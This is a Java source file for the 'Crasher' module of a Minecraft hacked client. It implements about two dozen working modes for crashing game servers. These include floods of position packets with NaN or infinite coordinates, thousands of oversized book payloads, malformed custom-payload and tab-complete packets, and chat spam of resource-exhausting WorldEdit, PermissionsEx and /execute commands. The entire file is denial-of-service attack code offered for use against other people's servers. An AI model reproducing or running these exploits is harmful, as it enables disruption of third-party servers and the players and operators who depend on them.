package crispy.features.hacks.impl.misc;

import crispy.Crispy;
import crispy.features.event.Event;
import crispy.features.event.impl.player.EventPacket;
import crispy.features.event.impl.player.EventUpdate;
import crispy.features.hacks.Category;
import crispy.features.hacks.Hack;
import crispy.features.hacks.HackInfo;
import crispy.features.hacks.impl.combat.Aura;
import crispy.util.time.TimeHelper;
import io.netty.buffer.Unpooled;
import lombok.val;
import lombok.var;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.*;
import net.minecraft.network.play.server.S01PacketJoinGame;
import net.minecraft.network.play.server.S40PacketDisconnect;
import net.minecraft.util.BlockPos;
import net.minecraft.util.ChatComponentText;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.IChatComponent;
import net.superblaubeere27.valuesystem.BooleanValue;
import net.superblaubeere27.valuesystem.ModeValue;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.commons.lang3.RandomUtils;

import java.util.Random;

@HackInfo(name = "Crasher", category = Category.MISC)
public class Crasher extends Hack {
    private final TimeHelper timeHelper = new TimeHelper();
    ModeValue mode = new ModeValue("Crasher Mode", "Packet", "Packet", "Animation", "Book", "Pex", "Old Worldedit", "Old Worldedit2", "Vanilla", "Dev", "ItemSwitcher", "Sign", "Sign2", "Operator", "KeepAlives", "TabComplete", "Infinity", "OldVelt", "AnticheatDev1", "AnticheatDev2", "BEdit", "Chunkload", "Cubecraft", "aacold", "Exploit", "Exploit2");
    BooleanValue cooldown = new BooleanValue("Cooldown", false, () -> mode.getMode().equalsIgnoreCase("Pex"));
    BooleanValue autodisable = new BooleanValue("AutoDisable", true);

    @Override
    public void onEnable() {
        if (mode.getMode().equalsIgnoreCase("Pex")) {
            timeHelper.reset();
        }
        if (mode.getMode().equalsIgnoreCase("Chunkload")) {
            // Fly up into sky
            var yPos = mc.thePlayer.posY;
            while (yPos < 255) {
                mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX, yPos, mc.thePlayer.posZ, true));
                yPos += 5.0;
            }

            // Fly over world
            var i = 0;
            while (i < 1337 * 5) {
                mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX + i, 255.0, mc.thePlayer.posZ + i, true));
                i += 5;
            }
        }
        if (mode.getMode().equalsIgnoreCase("aacold")) {
            mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
        }
        if (mode.getMode().equalsIgnoreCase("Cubecraft")) {
            mc.thePlayer.setPosition(mc.thePlayer.posX, mc.thePlayer.posY + 0.3, mc.thePlayer.posZ);
            val x = mc.thePlayer.posX;
            val y = mc.thePlayer.posY;
            val z = mc.thePlayer.posZ;
            var i = 0;
            while (i < 3000) {
                mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y + 0.09999999999999, z, false));
                mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, true));
                i++;
            }
            mc.thePlayer.motionY = 0.0;
        }
        if (mode.getMode().equalsIgnoreCase("book")) {
            final String randomString = RandomStringUtils.random(8, "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ");
            final ItemStack bookStack = new ItemStack(Items.writable_book);
            final NBTTagCompound bookCompound = new NBTTagCompound();
            bookCompound.setString("author", "Test");
            bookCompound.setString("title", "");
            final NBTTagList pageList = new NBTTagList();
            final String pageText = randomString;
            for (int page = 0; page < 50; ++page) {
                pageList.appendTag(new NBTTagString(pageText));
            }
            bookCompound.setTag("pages", pageList);
            bookStack.setTagCompound(bookCompound);
            for (int packets = 0; packets < 10000; ++packets) {
                final PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
                packetBuffer.writeItemStackToBuffer(bookStack);
                mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload(new Random().nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
            }
        }
        if (mode.getMode().equalsIgnoreCase("Animation")) {
            for (int i = 0; i < 1000; ++i) {
                mc.getNetHandler().addToSendQueue(new C0APacketAnimation());
            }
        }

        super.onEnable();

    }

    public void onDisable() {
        if (mode.getMode().equalsIgnoreCase("Pex")) {
        }
        super.onDisable();

    }

    @Override
    public void onEvent(Event e) {

        if (e instanceof EventPacket) {
            Packet packet = ((EventPacket) e).getPacket();
            if (autodisable.getObject()) {
                if (packet instanceof S40PacketDisconnect) {
                    toggle();
                }
                if (packet instanceof S01PacketJoinGame) {
                    toggle();
                }
            }
        }
        if (Minecraft.theWorld != null) {

            if (e instanceof EventUpdate) {
                if (timeHelper.hasReached(5000)) {
                    timeHelper.reset();
                    Crispy.addChatMessage("Attempting to crash server");
                }

                switch (mode.getMode()) {
                    case "Old Worldedit": {
                        if (mc.thePlayer.ticksExisted % 6 == 0) {
                            timeHelper.reset();
                            mc.thePlayer.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
                        }

                        break;
                    }

                    case "Old Worldedit2": {
                        if (mc.thePlayer.ticksExisted % 4 == 0) {
                            mc.thePlayer.sendChatMessage("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                            mc.thePlayer.sendChatMessage("//calculate for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                            mc.thePlayer.sendChatMessage("//solve for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                            mc.thePlayer.sendChatMessage("//evaluate for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                            mc.thePlayer.sendChatMessage("//eval for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                        }
                        break;
                    }
                    case "OldVelt": {
                        if (mc.thePlayer.ticksExisted % 50 == 0) {
                            for (int i = 0; i < 1000; ++i) {
                                mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX, mc.thePlayer.posY + 1.0, mc.thePlayer.posZ, false));
                                mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX, Double.MAX_VALUE, mc.thePlayer.posZ, false));
                                mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX, mc.thePlayer.posY - 1.0, mc.thePlayer.posZ, false));
                                Crispy.addChatMessage("attemped");
                            }
                            for (int i = 0; i < 10; ++i) {
                                mc.getNetHandler().addToSendQueue(new C00PacketKeepAlive(0));
                            }
                        }
                        break;
                    }

                    case "AnticheatDev1": {
                        for (int i = 0; i < 1000; ++i) {
                            mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C06PacketPlayerPosLook(Double.NaN, Double.NaN, Double.NaN, Float.NaN, Float.NaN, new Random().nextBoolean()));
                        }
                        break;
                    }
                    case "AnticheatDev2": {
                        for (int i = 0; i < 1000; ++i) {
                            mc.getNetHandler().addToSendQueue(new C00PacketKeepAlive(0));
                        }
                        break;
                    }

                    case "KeepAlives": {
                        final int r = RandomUtils.nextInt(0, 0);
                        for (int i = 0; i < 1000; ++i) {
                            mc.getNetHandler().addToSendQueue(new C00PacketKeepAlive(r));
                        }
                        break;

                    }
                    case "Dev": {
                        val size = ".................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................";

                        final String randomString = RandomStringUtils.random(8, "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ");
                        final ItemStack bookStack = new ItemStack(Items.writable_book);
                        final NBTTagCompound bookCompound = new NBTTagCompound();
                        final String pageText = randomString;
                        bookCompound.setString("author", "lmao");
                        bookCompound.setString("title", size);
                        bookCompound.setString("pages", pageText);

                        break;
                    }



                    case "Infinity": {
                        mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, new Random().nextBoolean()));
                        mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, new Random().nextBoolean()));
                        break;
                    }
                    case "TabComplete": {
                        Crispy.addChatMessage("test");
                        final double rand1 = RandomUtils.nextDouble(0.0, Double.MAX_VALUE);
                        final double rand2 = RandomUtils.nextDouble(0.0, Double.MAX_VALUE);
                        final double rand3 = RandomUtils.nextDouble(0.0, Double.MAX_VALUE);
                        mc.getNetHandler().addToSendQueue(new C14PacketTabComplete("ÖÖÃ�?�??½¼u§}e>?\\\"èëýüùõ÷åâ�?žŸƒÞÖÃ�?�??½¼u§}e>?\\\"èëýüùõ÷åâ�?žŸƒÞÖÃ�?�??½¼u§}e>?\\\"èëýüùõ÷åâ�?žŸƒÞÖÃ�?�??½¼u§}e>?\\\"èëýüùõ÷åâ�?žŸƒÞÖÃ�ÖÃ�?�??½¼u§}e>?\\\"èëýüùõ÷åâ�?žŸƒÞÖÃ�?�??½¼u§}e>?\\\"èëýüùõ÷åâ�?žŸƒÞÖÃ�?�??½¼u§}e>?\\\"èëýüùõ÷åâ�?žŸƒÞÖÃ�?�??½¼u§}e>?\\\"èëýüùõ÷åâ�?žŸƒÞÖÃ�?�??½¼u§}e>?\\\"èëýüùõ÷åâ�?žŸƒÞÖÃ�?�??½¼u§}e>?\\\"èëýüùõ÷åâ�?žŸƒÞ?�??½¼u§}e>?\\\"èëýüùõ÷åâ�?žŸƒÞÃ�?�??½¼u§}e>?\\\"èëýüùõ÷åâ�?žŸƒÞ", new BlockPos(rand1, rand2, rand3)));
                        break;
                    }
                    case "Operator": {
                        for (int i = 0; i < 150; ++i) {
                            mc.thePlayer.sendChatMessage("/execute @e ~ ~ ~ execute @e ~ ~ ~ execute @e ~ ~ ~ execute @e ~ ~ ~ summon Pig");
                        }
                        break;
                    }

                    case "BEdit": {
                        mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("ÖÃ�?�??½¼u§}e>?\"èëýüùõ÷åâ�?žŸƒÞ")));
                        mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload("MC|Brand", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("ÖÃ�?�??½¼u§}e>?\"èëýüùõ÷åâ�?žŸƒÞ")));
                        mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("ÖÃ�?�??½¼u§}e>?\"èëýüùõ÷åâ�?žŸƒÞ")));
                        mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload("MC|BOpen", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("ÖÃ�?�??½¼u§}e>?\"èëýüùõ÷åâ�?žŸƒÞ")));
                        mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("ÖÃ�?�??½¼u§}e>?\"èëýüùõ÷åâ�?žŸƒÞ")));
                        mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload("MC|TrList", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("ÖÃ�?�??½¼u§}e>?\"èëýüùõ÷åâ�?žŸƒÞ")));
                        mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("ÖÃ�?�??½¼u§}e>?\"èëýüùõ÷åâ�?žŸƒÞ")));
                        mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload("MC|TrSel", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("ÖÃ�?�??½¼u§}e>?\"èëýüùõ÷åâ�?žŸƒÞ")));
                        mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("ÖÃ�?�??½¼u§}e>?\"èëýüùõ÷åâ�?žŸƒÞ")));
                        mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload("MC|BEdit", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("ÖÃ�?�??½¼u§}e>?\"èëýüùõ÷åâ�?žŸƒÞ")));
                        mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("ÖÃ�?�??½¼u§}e>?\"èëýüùõ÷åâ�?žŸƒÞ")));
                        mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload("MC|BSign", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("ÖÃ�?�??½¼u§}e>?\"èëýüùõ÷åâ�?žŸƒÞ")));
                        break;
                    }

                    case "Vanilla": {
                        if (timeHelper.hasReached(1500)) {
                            val x = mc.thePlayer.posX;
                            val y = mc.thePlayer.posY;
                            val z = mc.thePlayer.posZ;
                            var i = 0;
                            while (i < 3000) {
                                mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y + 0.099999999999, z, false));
                                mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, true));
                                i++;
                            }
                            mc.thePlayer.motionY = 0.0;
                        }
                        break;
                    }
                    case "ItemSwitcher": {
                        for (int i2 = 0; i2 < 200; ++i2) {
                            mc.getNetHandler().addToSendQueue(new C09PacketHeldItemChange(i2));
                        }
                        break;
                    }
                    case "Sign": {
                        final IChatComponent[] lines = {new ChatComponentText("\n"), new ChatComponentText("\n"), new ChatComponentText("\n"), new ChatComponentText("\n")};
                        mc.getNetHandler().addToSendQueue(new C12PacketUpdateSign(new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY, mc.thePlayer.posZ), lines));
                        break;
                    }
                    case "Sign2": {
                        mc.getNetHandler().addToSendQueue(new C07PacketPlayerDigging(C07PacketPlayerDigging.Action.DROP_ALL_ITEMS, new BlockPos(mc.thePlayer.posX, mc.thePlayer.posY, mc.thePlayer.posZ), EnumFacing.UP));
                        break;
                    }
                    case "Pex": {
                        if (cooldown.getObject()) {
                            if (timeHelper.hasReached(2500)) {
                                timeHelper.reset();
                                mc.thePlayer.sendChatMessage("/pex promote ::::::::::::::::::::::::::::::::::::::::::::::" + Aura.randomNumber((float) 1, (float) 1000));
                            }
                        } else {
                            if (timeHelper.hasReached(650)) {
                                timeHelper.reset();
                                mc.thePlayer.sendChatMessage("/pex promote ::::::::::::::::::::::::::::::::::::::::::::::" + Aura.randomNumber((float) 1, (float) 1000));
                            }
                        }
                        break;
                    }

                    case "Exploit": {
                        final double rand1 = RandomUtils.nextDouble(0.1, 1.9);
                        final double rand2 = RandomUtils.nextDouble(0.1, 1.9);
                        final double rand3 = RandomUtils.nextDouble(0.1, 1.9);
                        final int rand4 = RandomUtils.nextInt(0, Integer.MAX_VALUE);
                        mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C06PacketPlayerPosLook(mc.thePlayer.posX + 1257892.0 * rand1, mc.thePlayer.posY + 9871521.0 * rand2, mc.thePlayer.posZ + 9081259.0 * rand3, mc.thePlayer.rotationYaw, mc.thePlayer.rotationPitch, new Random().nextBoolean()));
                        mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C06PacketPlayerPosLook(mc.thePlayer.posX - 9125152.0 * rand1, mc.thePlayer.posY - 1287664.0 * rand2, mc.thePlayer.posZ - 4582135.0 * rand3, mc.thePlayer.rotationYaw, mc.thePlayer.rotationPitch, new Random().nextBoolean()));
                        mc.getNetHandler().addToSendQueue(new C00PacketKeepAlive(rand4));
                        break;
                    }

                    case "Exploit2": {
                        mc.getNetHandler().addToSendNoEvent(new C03PacketPlayer.C05PacketPlayerLook(mc.thePlayer.rotationYaw, (float) (mc.thePlayer.rotationPitch - Double.POSITIVE_INFINITY), true));
                        break;
                    }
                }
            }
        }
    }
}

